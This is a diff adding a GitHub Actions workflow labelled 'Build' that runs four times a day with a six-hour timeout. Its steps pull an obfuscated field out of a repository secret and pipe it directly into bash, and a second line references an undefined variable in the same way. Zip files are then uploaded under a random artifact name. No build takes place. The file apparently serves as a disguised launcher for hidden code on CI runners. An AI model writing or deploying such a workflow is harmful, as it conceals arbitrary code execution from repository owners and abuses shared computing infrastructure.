@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          t1307: ${{ secrets.t1307 }}
+        run: |
+          printf '%s' "$t1307" | jq -r .ij62 | /bin/bash
+          printf '%s' "$s3204" | jq -r .pi98 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6QXHWGDr
+          path: "*.zip"
+          retention-days: 1
